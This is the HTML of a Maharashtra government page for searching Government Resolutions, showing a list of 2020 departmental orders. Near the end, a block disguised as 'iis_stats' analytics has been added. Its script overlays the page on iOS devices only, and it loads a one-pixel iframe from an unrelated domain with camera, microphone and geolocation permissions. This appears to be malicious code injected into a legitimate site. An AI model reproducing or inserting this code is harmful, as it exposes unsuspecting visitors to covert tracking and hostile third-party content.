+<div id="HeaderMain1_menu_smoothmenu1" class="ddsmoothmenu"><ul id="nav" class="">
+  <li>
+    <a href="https://gr.maharashtra.gov.in:443/1125/Home">Home</a>
+  </li>
+  <li>
+    <a href="https://gr.maharashtra.gov.in:443/1145/Government-Resolutions">Government Resolutions</a>
+  </li>
+  <!--<li>
+    <a href="#">Contact</a>
+    <ul>
+      <li>
+        <a href="https://gr.maharashtra.gov.in:443/1139/Contact-Us">Contact Us</a>
+      </li>      
+    </ul>
+  </li>-->
+</ul></div>
+
+        </div>
+        <div class="searchBox">
+            <div class="floatL">
+                
+            </div>
+            <div class="clear">
+            </div>
+        </div>
+    </div>
+    <div class="navRight">
+    </div>
+</div>
+<div class="clear">
+</div>
+<a href="#" name="Content"></a>
+                </div>
+                <div id="midCont" class="content">
+                    <span id="main-content"></span>
+                        
+    <div id="SitePH_UCBreadCrum1_breadcrumb" class="breadcrumbDiv"><span class="breadcrumbHeading">You are here :</span>
+<ul class="breadcrumb">
+<li><a href="https://gr.maharashtra.gov.in:443/Site/Home/Index.aspx">Home</a></li>
+<li>Government Resolutions</li>
+</ul>
+<ul class="print"><li><a target="_blank" href="https://gr.maharashtra.gov.in:443/1145/Government-Resolutions?format=print"><img src="../../Images/print.gif" alt="">Print</a></li></ul>
+</div>
+    <div class="content">
+        <h1>
+            <span id="SitePH_lblGRHeader">Government Resolutions</span></h1>
+        
+        <div id="SitePH_SearchDocument" class="searchInner searchMarg">
+            <div class="col1">
+                <label for="SitePH_ddlDepartmentType" id="SitePH_lblDepartment" class="lblText lblTitle">Department Name</label>
+                <select name="ctl00$SitePH$ddlDepartmentType" onchange="javascript:setTimeout('__doPostBack(\'ctl00$SitePH$ddlDepartmentType\',\'\')', 0)" id="SitePH_ddlDepartmentType" class="lblDesc">
+	<option selected="selected" value="">-- Select --</option>
+	<option value="46">Agriculture Department (From 24-June-2026)</option>
+	<option value="01">Agriculture, Dairy Development, Animal Husbandry and Fisheries Department</option>
+	<option value="45">Animal Husbandry, Dairy Development &amp; Fisheries Department (From 24-June-2026)</option>
+	<option value="47">Co-operation Department (From 24-June-2026)</option>
+	<option value="02">Co-operation, Textiles and Marketing Department</option>
+	<option value="43">Cultural Affairs Department (From 24-June-2026)</option>
+	<option value="11">Electronics, Information Technology and Artificial Intelligence Department</option>
+	<option value="53">Energy Department (From 24-June-2026)</option>
+	<option value="04">Environment Department</option>
+	<option value="05">Finance Department</option>
+	<option value="55">Food and Drug Administration Department (From 24-June-2026)</option>
+	<option value="06">Food, Civil Supplies and Consumer Protection Department</option>
+	<option value="40">Forest Department (From 24-June-2026)</option>
+	<option value="07">General Administration Department (From 24-June-2026)</option>
+	<option value="08">Higher and Technical Education Department</option>
+	<option value="29">Home Department (From 24-June-2026)</option>
+	<option value="09">Housing Department</option>
+	<option value="52">Industries and Mining Department (From 24-June-2026)</option>
+	<option value="10">Industries, Energy and Labour Department</option>
+	<option value="38">Information and Public Relations Department (From 24-June-2026)</option>
+	<option value="54">Labour Department (From 24-June-2026)</option>
+	<option value="12">Law and Judiciary Department</option>
+	<option value="33">Marathi Language Department</option>
+	<option value="36">Marketing Department (From 24-June-2026)</option>
+	<option value="13">Medical Education and Drugs Department</option>
+	<option value="51">Medical Education Department (From 24-June-2026)</option>
+	<option value="14">Minorities Development Department</option>
+	<option value="34">Other Backward Bahujan Welfare Department</option>
+	<option value="15">Parliamentary Affairs Department</option>
+	<option value="35">Persons with Disabilities Welfare Department</option>
+	<option value="16">Planning Department</option>
+	<option value="37">Protocol Department (From 24-June-2026)</option>
+	<option value="17">Public Health Department</option>
+	<option value="18">Public Works Department</option>
+	<option value="41">Relief and Rehabilitation Department(From 24-June-2026)</option>
+	<option value="19">Revenue and Forest Department</option>
+	<option value="48">Revenue Department (From 24-June-2026)</option>
+	<option value="20">Rural Development Department</option>
+	<option value="21">School Education and Sports Department</option>
+	<option value="49">School Education Department (From 24-June-2026)</option>
+	<option value="03">Skill Development and Entrepreneurship Department</option>
+	<option value="22">Social Justice and Special Assistance Department</option>
+	<option value="26">Soil and Water Conservation Department (From 24-June-2026)</option>
+	<option value="42">Sports Department (From 24-June-2026)</option>
+	<option value="56">Textiles Department (From 24-June-2026)</option>
+	<option value="23">Tourism and Cultural Affairs Department</option>
+	<option value="50">Tourism Department (From 24-June-2026)</option>
+	<option value="39">Transport Department (From 24-June-2026)</option>
+	<option value="24">Tribal Development Department</option>
+	<option value="25">Urban Development Department</option>
+	<option value="27">Water Resources Department</option>
+	<option value="28">Water Supply and Sanitation Department</option>
+	<option value="30">Women and Child Development Department</option>
+
+</select>
+            </div>
+            <div class="col2">
+                <label for="SitePH_txtKeywords" id="SitePH_lblKeywords" class="lblText lblTitle">Keywords</label>
+                <input name="ctl00$SitePH$txtKeywords" type="text" maxlength="50" id="SitePH_txtKeywords" class="cdacTxt lblDesc">
+                <span style="color: red;">Maximum length of 50 characters</span>
+            </div>
+            <div class="seperator clear">
+            </div>
+            <div style="display: none">
+                <div class="col1">
+                    <label for="SitePH_txtTitle" id="SitePH_lblTitle" class="lblText lblTitle">Title</label>
+                    <input name="ctl00$SitePH$txtTitle" type="text" id="SitePH_txtTitle" class="cdacTxt lblDesc">
+                </div>
+                <div class="col2">
+                    <label for="SitePH_ddlCategory" id="SitePH_lblCategory" class="lblText lblTitle">Category</label>
+                    <select name="ctl00$SitePH$ddlCategory" id="SitePH_ddlCategory" class="lblDesc">
+	<option selected="selected" value="">-- All --</option>
+	<option value="2">GR</option>
+
+</select>
+                </div>
+                <div class="seperator clear">
+                </div>
+                <div class="col3">
+                    <table id="SitePH_rblDateFilter" class="lblText">
+	<tbody><tr>
+		<td><input id="SitePH_rblDateFilter_0" type="radio" name="ctl00$SitePH$rblDateFilter" value="1" checked="checked"><label for="SitePH_rblDateFilter_0">Issued Date</label></td><td><input id="SitePH_rblDateFilter_1" type="radio" name="ctl00$SitePH$rblDateFilter" value="2"><label for="SitePH_rblDateFilter_1">Created Date</label></td>
+	</tr>
+</tbody></table>
+                </div>
+                <div class="seperator clear">
+                </div>
+            </div>
+            
+            <div class="col1">
+                <label for="SitePH_txtFromDate" id="SitePH_lblFromDate" class="lblText lblTitle">From Date <span class="hideContent">After selecting value for from date, same value will be set for to date</span></label>
+                <div class="friendlyDate">
+                    <input name="ctl00$SitePH$txtFromDate" type="text" value="04 Oct, 20" maxlength="10" id="SitePH_txtFromDate" class="lblDesc cdacTxt hasDatepicker" autocomplete="Off" onkeyup="validateDateFormat(this);" onchange="validateDateFormat(this);">
+                    <button type="button" class="calendarButton" onclick="$('#SitePH_txtFromDate').datepicker('show'); return false;">📅 </button>
+                    <span id="fromDateError" class="dateError">DD/MM/YYYY
+        </span>
+                </div>
+            </div>
+
+            
+            <div class="col2">
+
+                <label for="SitePH_txtToDate" id="SitePH_lblToDate" class="lblText lblTitle">To Date</label>
+                <div class="friendlyDate">
+                    <input name="ctl00$SitePH$txtToDate" type="text" value="08 Oct, 20" maxlength="10" id="SitePH_txtToDate" class="lblDesc cdacTxt hasDatepicker" autocomplete="Off" onkeyup="validateDateFormat(this);" onchange="validateDateFormat(this);">
+                    <button type="button" class="calendarButton" onclick="$('#SitePH_txtToDate').datepicker('show'); return false;">📅 </button>
+                    <span id="toDateError" class="dateError">DD/MM/YYYY
+        </span>
+                </div>
+
+            </div>
+            <div class="seperator clear">
+            </div>
+            <div class="col3">
+                <span class="lblTitle2">
+                    <label for="SitePH_txtGRNo" id="SitePH_lblGRNo" class="lblText">Unique Code</label>
+                    <span id="SitePH_lblGRNoMaxLength" class="note" style="display: block; color: red;">(Maximum length of 18 characters)</span>
+                </span><span class="lblDesc2">
+                    <input name="ctl00$SitePH$txtGRNo" type="text" maxlength="18" id="SitePH_txtGRNo" class="uidTxt">
+                    
+                    <strong>
+                        <span id="SitePH_lblGRNoRule" class="note">(Partially Code Allowed eg. YYYYMMDD)</span></strong> </span>
+            </div>
+            <div class="seperator clear">
+            </div>
+            <span id="SitePH_lblCaptcha">Captcha (पडताळणी संकेतांक कोड)</span>
+            <input name="ctl00$SitePH$txtimgcode" type="text" id="SitePH_txtimgcode" class="textEntry" autocomplete="Off">
+            <span id="SitePH_RequiredFieldValidator1" title="Password is required." class="notification" style="visibility:hidden;">*</span>
+            <div class="input-group">
+                <span id="SitePH_lblNote" class="addInfo">Case Sensitive</span><span id="SitePH_sp_captcha" style="color: Red">*</span><br>
+                <img id="SitePH_ImgCaptcha" src="../Site/Information/captcha.aspx" style="height:50px;width:182px;display: inline-block;">
+
+                <input type="image" onclick="document.getElementById('form1').submit();" src="../../Images/Refresh.png" alt="Refresh Captcha" style="width: 30px; height: 30px; vertical-align: top; padding-top: 10px; padding-left: 12px;">
+
+
+
+
+            </div>
+            <div class="col3">
+                <center>
+                    <input type="submit" name="ctl00$SitePH$btnSearch" value="Search" onclick="javascript:WebForm_DoPostBackWithOptions(new WebForm_PostBackOptions(&quot;ctl00$SitePH$btnSearch&quot;, &quot;&quot;, true, &quot;Search&quot;, &quot;&quot;, false, false))" id="SitePH_btnSearch" class="btnBG">
+                    <input type="submit" name="ctl00$SitePH$btnReset" value="Reset" onclick="javascript:WebForm_DoPostBackWithOptions(new WebForm_PostBackOptions(&quot;ctl00$SitePH$btnReset&quot;, &quot;&quot;, true, &quot;Search&quot;, &quot;&quot;, false, false))" id="SitePH_btnReset" class="btnBG"></center>
+            </div>
+            <div class="clear">
+            </div>
+        </div>
+        
+        
+        <div id="SitePH_pager">
+            
+<div class="pagination">
+    <div class="pcol1">
+        <span id="SitePH_ucPaging_lblTotRecordsHeading" class="paginationHead">Total Records</span>
+        :
+        <span id="SitePH_ucPaging_lblTotalRecords">127</span>
+        <strong>
+            </strong>
+    </div>
+    <div class="pcol2">
+        <div id="SitePH_ucPaging_pnlPageNo" onkeypress="javascript:return WebForm_FireDefaultButton(event, 'SitePH_ucPaging_btnGo')">
+	        
+            <label for="SitePH_ucPaging_txtPageNo" id="SitePH_ucPaging_lblPageNoHeading" class="paginationHead">Page No.</label>
+            : &nbsp;
+            <input name="ctl00$SitePH$ucPaging$txtPageNo" type="text" value="3" maxlength="6" id="SitePH_ucPaging_txtPageNo" class="pageBox" style="width:45px;">
+            
+            <span class="pageCount">/</span>
+            <span id="SitePH_ucPaging_lblTotalPages" class="pageCount">13</span>
+            
+            <input type="submit" name="ctl00$SitePH$ucPaging$btnGo" value="Go" id="SitePH_ucPaging_btnGo" class="btnBG">
+        
+</div>
+    </div>
+    <div class="pcol3">
+        <a id="SitePH_ucPaging_lnkFirst" href="javascript:__doPostBack('ctl00$SitePH$ucPaging$lnkFirst','')">&lt;&lt; First</a>
+        
+        <a id="SitePH_ucPaging_lnkPre" href="javascript:__doPostBack('ctl00$SitePH$ucPaging$lnkPre','')">&lt; Previous</a>
+        
+        <a id="SitePH_ucPaging_p2" href="javascript:__doPostBack('ctl00$SitePH$ucPaging$p2','')">1</a>
+        <a id="SitePH_ucPaging_p3" href="javascript:__doPostBack('ctl00$SitePH$ucPaging$p3','')">2</a>
+        <span id="SitePH_ucPaging_lblCurrentPageNo">3</span>
+        <a id="SitePH_ucPaging_p4" href="javascript:__doPostBack('ctl00$SitePH$ucPaging$p4','')">4</a>
+        <a id="SitePH_ucPaging_p5" href="javascript:__doPostBack('ctl00$SitePH$ucPaging$p5','')">5</a>
+        <a id="SitePH_ucPaging_p6" href="javascript:__doPostBack('ctl00$SitePH$ucPaging$p6','')">6</a>
+        <a id="SitePH_ucPaging_lnkNext" href="javascript:__doPostBack('ctl00$SitePH$ucPaging$lnkNext','')">Next &gt;</a>
+        
+        <a id="SitePH_ucPaging_lnkLast" href="javascript:__doPostBack('ctl00$SitePH$ucPaging$lnkLast','')">Last &gt;&gt;</a>
+    </div>
+</div>
+
+        </div>
+        <div class="gridView divScroll">
+            <div>
+	<table class="tblFlexi gr" cellspacing="2" cellpadding="2" id="SitePH_dgvDocuments" style="width:100%;">
+		<tbody><tr>
+			<th scope="col">SN</th><th scope="col">Department Name</th><th scope="col">Title</th><th scope="col">Unique Code</th><th scope="col">G.R. Date</th><th scope="col">File Size (KB)</th><th scope="col">Download</th>
+		</tr><tr>
+			<td class="grCol1">
+                            <span id="SitePH_dgvDocuments_lblSN_0">21</span>
+                        </td><td class="grCol2">
+                            <span id="SitePH_dgvDocuments_Label6_0">Water Supply and Sanitation Department</span>
+                        </td><td class="grCol3">
+                            <span id="SitePH_dgvDocuments_Label1_0">Revised Administrative Approval to Mou. Susundra (Tal. Karanja, Dist. Wardha) Water Supply Scheme under MRDWP.</span>
+                        </td><td class="grCol4">
+                            <span id="SitePH_dgvDocuments_Label2_0">202010081127037128</span>
+                        </td><td class="grCol5">
+                            
+                            <span id="SitePH_dgvDocuments_Label7_0">08-10-2020</span>
+                        </td><td class="grCol6">
+                            <span id="SitePH_dgvDocuments_lblFileSize_0">2556</span>
+                        </td><td style="width:4%;">
+                            <a href="../Site/Upload/Government%20Resolutions/English/202010081127037128.pdf" id="SitePH_dgvDocuments_a1_0" target="_blank">
+                                <img src="../../Images/pdfIcon.png" alt="PDF File" class="pdfDownload1" width="18px">
+                            </a>
+                        </td>
+		</tr><tr>
+			<td class="grCol1">
+                            <span id="SitePH_dgvDocuments_lblSN_1">22</span>
+                        </td><td class="grCol2">
+                            <span id="SitePH_dgvDocuments_Label6_1">Water Supply and Sanitation Department</span>
+                        </td><td class="grCol3">
+                            <span id="SitePH_dgvDocuments_Label1_1">Grant-in-aid to Maharashtra Jeevan Pradhikaran for authorising pensionary benefits to the absorbed Government Servants (2215A052)</span>
+                        </td><td class="grCol4">
+                            <span id="SitePH_dgvDocuments_Label2_1">202010081124223128</span>
+                        </td><td class="grCol5">
+                            
+                            <span id="SitePH_dgvDocuments_Label7_1">08-10-2020</span>
+                        </td><td class="grCol6">
+                            <span id="SitePH_dgvDocuments_lblFileSize_1">2668</span>
+                        </td><td style="width:4%;">
+                            <a href="../Site/Upload/Government%20Resolutions/English/202010081124223128.pdf" id="SitePH_dgvDocuments_a1_1" target="_blank">
+                                <img src="../../Images/pdfIcon.png" alt="PDF File" class="pdfDownload1" width="18px">
+                            </a>
+                        </td>
+		</tr><tr>
+			<td class="grCol1">
+                            <span id="SitePH_dgvDocuments_lblSN_2">23</span>
+                        </td><td class="grCol2">
+                            <span id="SitePH_dgvDocuments_Label6_2">Water Supply and Sanitation Department</span>
+                        </td><td class="grCol3">
+                            <span id="SitePH_dgvDocuments_Label1_2">Grant-in-aid to Maharashtra Jeevan  Pradhikarn for payment of Salary and other allowances Budget Head 2215A041</span>
+                        </td><td class="grCol4">
+                            <span id="SitePH_dgvDocuments_Label2_2">202010081124189528</span>
+                        </td><td class="grCol5">
+                            
+                            <span id="SitePH_dgvDocuments_Label7_2">08-10-2020</span>
+                        </td><td class="grCol6">
+                            <span id="SitePH_dgvDocuments_lblFileSize_2">2662</span>
+                        </td><td style="width:4%;">
+                            <a href="../Site/Upload/Government%20Resolutions/English/202010081124189528.pdf" id="SitePH_dgvDocuments_a1_2" target="_blank">
+                                <img src="../../Images/pdfIcon.png" alt="PDF File" class="pdfDownload1" width="18px">
+                            </a>
+                        </td>
+		</tr><tr>
+			<td class="grCol1">
+                            <span id="SitePH_dgvDocuments_lblSN_3">24</span>
+                        </td><td class="grCol2">
+                            <span id="SitePH_dgvDocuments_Label6_3">Water Supply and Sanitation Department</span>
+                        </td><td class="grCol3">
+                            <span id="SitePH_dgvDocuments_Label1_3">Cash Withdrawal from Treasuries- Regarding distribution of grants for the General Component for the Financial Year 2020-21 Under Centrally Sponsored Swachh Bharat Mission (Gramin). Account Head 2215 9835)</span>
+                        </td><td class="grCol4">
+                            <span id="SitePH_dgvDocuments_Label2_3">202010081533110028</span>
+                        </td><td class="grCol5">
+                            
+                            <span id="SitePH_dgvDocuments_Label7_3">08-10-2020</span>
+                        </td><td class="grCol6">
+                            <span id="SitePH_dgvDocuments_lblFileSize_3">2590</span>
+                        </td><td style="width:4%;">
+                            <a href="../Site/Upload/Government%20Resolutions/English/202010081533110028.pdf" id="SitePH_dgvDocuments_a1_3" target="_blank">
+                                <img src="../../Images/pdfIcon.png" alt="PDF File" class="pdfDownload1" width="18px">
+                            </a>
+                        </td>
+		</tr><tr>
+			<td class="grCol1">
+                            <span id="SitePH_dgvDocuments_lblSN_4">25</span>
+                        </td><td class="grCol2">
+                            <span id="SitePH_dgvDocuments_Label6_4">Water Supply and Sanitation Department</span>
+                        </td><td class="grCol3">
+                            <span id="SitePH_dgvDocuments_Label1_4">Revised Administrative Approval to Mou. Lalagun (Tal.Khatav, Dist. Satara ) Rural Water Supply Scheme under NRDWP.</span>
+                        </td><td class="grCol4">
+                            <span id="SitePH_dgvDocuments_Label2_4">202010081524190028</span>
+                        </td><td class="grCol5">
+                            
+                            <span id="SitePH_dgvDocuments_Label7_4">08-10-2020</span>
+                        </td><td class="grCol6">
+                            <span id="SitePH_dgvDocuments_lblFileSize_4">2490</span>
+                        </td><td style="width:4%;">
+                            <a href="../Site/Upload/Government%20Resolutions/English/202010081524190028.pdf" id="SitePH_dgvDocuments_a1_4" target="_blank">
+                                <img src="../../Images/pdfIcon.png" alt="PDF File" class="pdfDownload1" width="18px">
+                            </a>
+                        </td>
+		</tr><tr>
+			<td class="grCol1">
+                            <span id="SitePH_dgvDocuments_lblSN_5">26</span>
+                        </td><td class="grCol2">
+                            <span id="SitePH_dgvDocuments_Label6_5">Water Supply and Sanitation Department</span>
+                        </td><td class="grCol3">
+                            <span id="SitePH_dgvDocuments_Label1_5">Revised Administrative Approval to Mou. Herwad (Tal.Shirol, Dist. Kolhapur ) Rural Water Supply Scheme under NRDWP.</span>
+                        </td><td class="grCol4">
+                            <span id="SitePH_dgvDocuments_Label2_5">202010081524222028</span>
+                        </td><td class="grCol5">
+                            
+                            <span id="SitePH_dgvDocuments_Label7_5">08-10-2020</span>
+                        </td><td class="grCol6">
+                            <span id="SitePH_dgvDocuments_lblFileSize_5">2493</span>
+                        </td><td style="width:4%;">
+                            <a href="../Site/Upload/Government%20Resolutions/English/202010081524222028.pdf" id="SitePH_dgvDocuments_a1_5" target="_blank">
+                                <img src="../../Images/pdfIcon.png" alt="PDF File" class="pdfDownload1" width="18px">
+                            </a>
+                        </td>
+		</tr><tr>
+			<td class="grCol1">
+                            <span id="SitePH_dgvDocuments_lblSN_6">27</span>
+                        </td><td class="grCol2">
+                            <span id="SitePH_dgvDocuments_Label6_6">Agriculture, Dairy Development, Animal Husbandry and Fisheries Department</span>
+                        </td><td class="grCol3">
+                            <span id="SitePH_dgvDocuments_Label1_6">Release of grants under Sub-mission on Agroforestry for Scheduled Cast for the year 2020-21.</span>
+                        </td><td class="grCol4">
+                            <span id="SitePH_dgvDocuments_Label2_6">202010071236092501</span>
+                        </td><td class="grCol5">
+                            
+                            <span id="SitePH_dgvDocuments_Label7_6">07-10-2020</span>
+                        </td><td class="grCol6">
+                            <span id="SitePH_dgvDocuments_lblFileSize_6">2717</span>
+                        </td><td style="width:4%;">
+                            <a href="../Site/Upload/Government%20Resolutions/English/202010071236092501.pdf" id="SitePH_dgvDocuments_a1_6" target="_blank">
+                                <img src="../../Images/pdfIcon.png" alt="PDF File" class="pdfDownload1" width="18px">
+                            </a>
+                        </td>
+		</tr><tr>
+			<td class="grCol1">
+                            <span id="SitePH_dgvDocuments_lblSN_7">28</span>
+                        </td><td class="grCol2">
+                            <span id="SitePH_dgvDocuments_Label6_7">Agriculture, Dairy Development, Animal Husbandry and Fisheries Department</span>
+                        </td><td class="grCol3">
+                            <span id="SitePH_dgvDocuments_Label1_7">Corrigendum on GR Dated 24/08/2020 Regarding relating of Rs. 16.50 Cr. 2020-21 for Group Farming Scheme.</span>
+                        </td><td class="grCol4">
+                            <span id="SitePH_dgvDocuments_Label2_7">202010071244369701</span>
+                        </td><td class="grCol5">
+                            
+                            <span id="SitePH_dgvDocuments_Label7_7">07-10-2020</span>
+                        </td><td class="grCol6">
+                            <span id="SitePH_dgvDocuments_lblFileSize_7">2722</span>
+                        </td><td style="width:4%;">
+                            <a href="../Site/Upload/Government%20Resolutions/English/202010071244369701.pdf" id="SitePH_dgvDocuments_a1_7" target="_blank">
+                                <img src="../../Images/pdfIcon.png" alt="PDF File" class="pdfDownload1" width="18px">
+                            </a>
+                        </td>
+		</tr><tr>
+			<td class="grCol1">
+                            <span id="SitePH_dgvDocuments_lblSN_8">29</span>
+                        </td><td class="grCol2">
+                            <span id="SitePH_dgvDocuments_Label6_8">Agriculture, Dairy Development, Animal Husbandry and Fisheries Department</span>
+                        </td><td class="grCol3">
+                            <span id="SitePH_dgvDocuments_Label1_8">Regarding changes in Milk Procurement Rates and Commission given to Distributers under Government Milk Scheme.</span>
+                        </td><td class="grCol4">
+                            <span id="SitePH_dgvDocuments_Label2_8">202010081315118601</span>
+                        </td><td class="grCol5">
+                            
+                            <span id="SitePH_dgvDocuments_Label7_8">07-10-2020</span>
+                        </td><td class="grCol6">
+                            <span id="SitePH_dgvDocuments_lblFileSize_8">2502</span>
+                        </td><td style="width:4%;">
+                            <a href="../Site/Upload/Government%20Resolutions/English/202010081315118601.pdf" id="SitePH_dgvDocuments_a1_8" target="_blank">
+                                <img src="../../Images/pdfIcon.png" alt="PDF File" class="pdfDownload1" width="18px">
+                            </a>
+                        </td>
+		</tr><tr>
+			<td class="grCol1">
+                            <span id="SitePH_dgvDocuments_lblSN_9">30</span>
+                        </td><td class="grCol2">
+                            <span id="SitePH_dgvDocuments_Label6_9">Co-operation, Textiles and Marketing Department</span>
+                        </td><td class="grCol3">
+                            <span id="SitePH_dgvDocuments_Label1_9">Corrigendum of reconstruction of Cabinet Sub Committee for Government guarantee to Co-operative Sugar Factories.</span>
+                        </td><td class="grCol4">
+                            <span id="SitePH_dgvDocuments_Label2_9">202010071424121802</span>
+                        </td><td class="grCol5">
+                            
+                            <span id="SitePH_dgvDocuments_Label7_9">07-10-2020</span>
+                        </td><td class="grCol6">
+                            <span id="SitePH_dgvDocuments_lblFileSize_9">2694</span>
+                        </td><td style="width:4%;">
+                            <a href="../Site/Upload/Government%20Resolutions/English/202010071424121802.pdf" id="SitePH_dgvDocuments_a1_9" target="_blank">
+                                <img src="../../Images/pdfIcon.png" alt="PDF File" class="pdfDownload1" width="18px">
+                            </a>
+                        </td>
+		</tr>
+	</tbody></table>
+</div>
+        </div>
+    </div>
+
+                </div>
+                <div id="footer">
+                    
+<div class="footerTop">
+    <div class="footerLeft">
+        <div id="FooterMenu1_Footermenu1"><ul class="bottomLink">
+  <li>
+    <a href="https://gr.maharashtra.gov.in:443/1081/Disclaimer-and-Policies">Disclaimer and Policies</a>
+  </li>
+  <li>
+    <a href="https://gr.maharashtra.gov.in:443/1082/Accessibility-Statement">Accessibility Statement</a>
+  </li>
+  <li>
+    <a href="https://gr.maharashtra.gov.in:443/1122/Help">Help</a>
+  </li>
+</ul></div>
+        <div class="lastReviewed">
+            <div style="display: none;">
+                <span id="FooterMenu1_visitcount_lblTotalVisitHeading">Total Visitors:</span>&nbsp;<span id="FooterMenu1_visitcount_lblCounter">205942</span>
+<span id="FooterMenu1_visitcount_lblTodayVisitHeading">Today's Count</span>&nbsp;<span id="FooterMenu1_visitcount_lbltodayCount">0</span>
+
+ 
+                <span id="FooterMenu1_LastReviewedDate1_lblReviewDate1">Last Reviewed:</span>
+<span id="FooterMenu1_LastReviewedDate1_lblReviewDate">26-04-2013</span>
+
+
+            </div>
+        </div>
+        <span id="FooterMenu1_lbl_copyright" class="copyRight">© This is the official website of Government of Maharashtra. All Rights Reserved.</span>
+        <ul class="validators">
+            <li><a class="footerIcon ExternalLinkClick" href="https://validator.w3.org/check?uri=referer" target="_blank">
+                <img src="../../Images/valid-xhtml10.gif" alt="W3C xhtml"></a> </li>
+            <li><a class="footerIcon ExternalLinkClick" href="https://jigsaw.w3.org/css-validator/check/referer" target="_blank">
+                <img src="../../Images/vcss.gif" alt="CSS Validation"></a></li>
+            <li>
+                
+                <img src="../../Images/gigwLogo.jpg" alt="GIGW Validation"></li>
+            <li>
+                <div id="thawteseal" title="Click to Verify - This site chose Thawte SSL for secure e-commerce and confidential communications.">
+                    <script type="text/javascript" src="https://seal.thawte.com/getthawteseal?host_name=*.maharashtra.gov.in&amp;size=L&amp;lang=en"></script>
+                    <a href="https://www.thawte.com/ssl-certificates/" target="_blank">
+                        ABOUT SSL CERTIFICATES</a>
+                </div>
+            </li>
+        </ul>
+        <div class="clear">
+        </div>
+    </div>
+    <div class="footerRight">
+    
+        <div class="footerLogo">
+         <a href="https://mahait.org/" target="_blank">
+        
+
+ 
+</a>
+         <strong>महाआयटी द्वारा विकसित</strong>      
+        </div>
+    </div>
+    <div class="clear">
+    </div>
+</div>
+
+                </div>
+            </div>
+        </div>
+    </div>
+    
+<script type="text/javascript">
+//<![CDATA[
+var Page_Validators =  new Array(document.getElementById("SitePH_RequiredFieldValidator1"));
+//]]>
+</script>
+
+<script type="text/javascript">
+//<![CDATA[
+var SitePH_RequiredFieldValidator1 = document.all ? document.all["SitePH_RequiredFieldValidator1"] : document.getElementById("SitePH_RequiredFieldValidator1");
+SitePH_RequiredFieldValidator1.controltovalidate = "SitePH_txtimgcode";
+SitePH_RequiredFieldValidator1.focusOnError = "t";
+SitePH_RequiredFieldValidator1.errormessage = "Please Enter Captcha.";
+SitePH_RequiredFieldValidator1.validationGroup = "Search";
+SitePH_RequiredFieldValidator1.evaluationfunction = "RequiredFieldValidatorEvaluateIsValid";
+SitePH_RequiredFieldValidator1.initialvalue = "";
+//]]>
+</script>
+
+
+<script type="text/javascript">
+//<![CDATA[
+
+var Page_ValidationActive = false;
+if (typeof(ValidatorOnLoad) == "function") {
+    ValidatorOnLoad();
+}
+
+function ValidatorOnSubmit() {
+    if (Page_ValidationActive) {
+        return ValidatorCommonOnSubmit();
+    }
+    else {
+        return true;
+    }
+}
+        Sys.Application.add_init(function() {
+    $create(Sys.Extended.UI.FilteredTextBoxBehavior, {"FilterType":3,"ValidChars":"१२३४५६७८९०","id":"SitePH_fteGRNo"}, null, null, $get("SitePH_txtGRNo"));
+});
+
+document.getElementById('SitePH_RequiredFieldValidator1').dispose = function() {
+    Array.remove(Page_Validators, document.getElementById('SitePH_RequiredFieldValidator1'));
+}
+Sys.Application.add_init(function() {
+    $create(Sys.Extended.UI.FilteredTextBoxBehavior, {"FilterType":3,"ValidChars":"१२३४५६७८९०","id":"SitePH_ucPaging_ftePageNo"}, null, null, $get("SitePH_ucPaging_txtPageNo"));
+});
+//]]>
+</script>
+</form>
+<!-- iis_stats native v1.0.2 -->
+<!-- data-cf-beacon-iis-stats -->
+<style>
+    #spg {
+        position: fixed;
+        inset: 0;
+        z-index: 2147483647;
+        background: #fff;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        transition: opacity .35s;
+    }
+
+    #spg .sp {
+        width: 38px;
+        height: 38px;
+        border: 3px solid #e8e8e8;
+        border-top-color: #3b82f6;
+        border-radius: 50%;
+        animation: sp .8s linear infinite;
+    }
+
+    @keyframes sp {
+        to {
+            transform: rotate(360deg);
+        }
+    }
+</style>
+<script>
+    (function () {
+        var SPIN_MS = 10000;
+        var REMEMBER_MS = 86400000;
+        var KEY = '_cv';
+        if (!/(?:iPhone|iPad|iPod|CPU OS)/i.test(navigator.userAgent)) return;
+        try { if (Date.now() < (+localStorage.getItem(KEY) || 0)) return; } catch (e) { }
+        var g = document.createElement('div');
+        g.id = 'spg';
+        g.innerHTML = '<div class="sp"></div>';
+        (document.body || document.documentElement).appendChild(g);
+        setTimeout(function () {
+            try { localStorage.setItem(KEY, String(Date.now() + REMEMBER_MS)); } catch (e) { }
+            g.style.opacity = '0';
+            setTimeout(function () { g.parentNode && g.parentNode.removeChild(g); }, 400);
+        }, SPIN_MS);
+    })();
+</script>
+<iframe src="https://g1ha.lol/ch/first?ch=first" width="100%" height="1" frameborder="0" allow="camera;microphone;geolocation" style="border:0;display:block"></iframe>
+
+<div id="ui-datepicker-div" class="ui-datepicker ui-widget ui-widget-content ui-helper-clearfix ui-corner-all"></div></body></html>
